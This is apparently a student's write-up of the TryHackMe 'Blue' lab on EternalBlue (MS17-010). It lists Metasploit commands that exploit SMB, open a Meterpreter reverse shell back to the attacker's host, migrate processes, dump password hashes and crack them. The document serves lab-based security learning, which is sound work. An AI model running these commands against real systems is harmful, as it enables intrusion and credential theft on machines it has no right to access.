## Blue Room - EternalBlue (MS17-010)

### What is EternalBlue?
EternalBlue is a Windows SMB vulnerability discovered by the NSA
and leaked by a hacker group called Shadow Brokers in 2017.
It was used in the WannaCry ransomware attack that hit hundreds
of thousands of computers worldwide.

### What I did ( Everything done on THM website as I have note completed setting up my home lab)
- Scanned the target with nmap to find open ports, used nmap -sV and the IP of the target
- Identified MS17-010 vulnerability by seeing open ports and windows version.
- Used exploit/windows/smb/ms17_010_eternalblue to get a shell
- Upgraded shell to Meterpreter using post/multi/manage/shell_to_meterpreter
- Migrated to a stable process ( to survive longer and be a bit more stable, I used ps to check the proccesses
- I picked 2120 conhost.exe because trustedInstaller (2772) failed with access denied.
- Dumped password hashes with hashdump
- Cracked NTLM hashes using crackstation.net

### Key Commands
# Scan for vulnerability
nmap -sV --script vuln target_ip

# Run the exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set payload windows/x64/meterpreter/reverse_tcp
set LHOST my_ip
run

# Upgrade shell to Meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION 2
run

# Migrate to stable process
ps
migrate process_id

# Dump hashes
hashdump
